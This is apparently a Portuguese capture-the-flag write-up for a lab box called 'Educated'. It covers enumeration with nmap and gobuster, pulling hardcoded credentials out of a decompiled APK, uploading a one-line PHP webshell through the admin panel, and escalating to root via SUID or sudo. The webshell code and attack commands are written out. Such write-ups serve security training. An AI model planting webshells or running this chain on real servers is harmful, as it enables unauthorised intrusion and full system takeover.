# Educated
> Free School CMS + jadx APK reversing

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html
```

Aplicação "Free School" identificada. APK disponível para download.

## Exploração

Análise do APK com `jadx` para extrair credenciais hardcoded:

```
jadx -d output/ app.apk
grep -r "password\|secret\|api_key" output/
```

Credenciais encontradas no código Java decompilado.

Acesso ao painel admin → upload de webshell PHP.

```
# webshell.php
<?php system($_GET['cmd']); ?>
```

Reverse shell obtido.

## Escalada de Privilégio

```
sudo -l
find / -perm -4000 2>/dev/null
```

Caminho de escalada via binário SUID ou configuração sudo.

```
/bin/bash -p
```

Root obtido.
